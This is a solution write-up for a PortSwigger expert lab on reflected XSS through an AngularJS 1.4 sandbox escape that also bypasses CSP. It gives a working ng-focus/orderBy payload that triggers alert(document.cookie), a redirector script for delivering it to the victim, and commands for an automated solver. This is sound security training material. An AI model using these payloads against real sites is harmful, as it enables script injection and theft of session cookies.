# Reflected XSS with AngularJS sandbox escape and CSP — Solution

Lab: <https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp>
Difficulty: EXPERT

## Vulnerability chain

1. `GET /?search=<input>` reflects the value **unencoded** into `<h1>0 search results for '...'</h1>`.
2. The whole document is an AngularJS 1.4.4 application (`<body ng-app ng-csp>`,
   `/resources/js/angular_1-4-4.js`), so injected markup is compiled as an Angular
   template — HTML injection becomes client-side template injection.
3. CSP is `default-src 'self'; script-src 'self'; style-src 'unsafe-inline' 'self'`,
   so inline `<script>` and inline `on*` handlers are dead. The Angular directive
   path needs no inline script, which is the CSP bypass.
4. The AngularJS 1.4 sandbox blocks `window` and the `constructor` chain in
   expressions, but does **not** police the argument of a filter. `orderBy`
   evaluates its predicate against every element of `$event.composedPath()`, whose
   last element is `window`; evaluating there runs `alert` in window scope.

## Payload

```
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>
```

`#x` navigates to the injected element, Chrome focuses it, `ng-focus` fires and the
alert runs with `document.cookie`.

## Delivery

The lab is reflected-only, so the victim must be sent to the crafted URL. The
exploit server (discovered from the lab header) stores a redirector:

```html
<script>location='https://<LAB-ID>.web-security-academy.net/?search=%3Cinput%20id%3Dx%20ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28z%3Dalert%29%28document.cookie%29%27%3E#x';</script>
```

then `Deliver exploit to victim`.

## Automated

```bash
cd /root/Desktop/PortSwigger_Labs/EXPERT/Reflected-XSS-with-AngularJS-sandbox-escape-and-CSP
uv run python solve.py --url "https://<LAB-ID>.web-security-academy.net"
```

Or from the repository root through the universal launcher:

```bash
cd /root/Desktop/PortSwigger_Labs
uv run python solve.py --url "https://<LAB-ID>.web-security-academy.net"
```

## Verified result

Run of 2026-11-06 on a fresh instance: baseline `is-notsolved` → payload reflected
verbatim (control) → exploit stored and fetched back → delivered → lab widget
`widgetcontainer-lab-status is-solved` / `<p>Solved</p>` **4 s after delivery**,
9 HTTP requests end-to-end.
